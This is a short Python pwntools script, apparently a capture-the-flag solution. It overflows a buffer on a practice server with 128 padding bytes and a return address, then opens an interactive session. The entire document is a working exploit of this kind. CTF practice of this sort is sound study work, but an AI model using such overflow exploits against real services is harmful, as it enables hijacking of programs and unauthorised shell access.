from pwn import *
r = remote("ctf.j0n9hyun.xyz",3001)
a = "A" * 128
a += p32(0x0804849B)
r.sendline(a)
r.interactive()
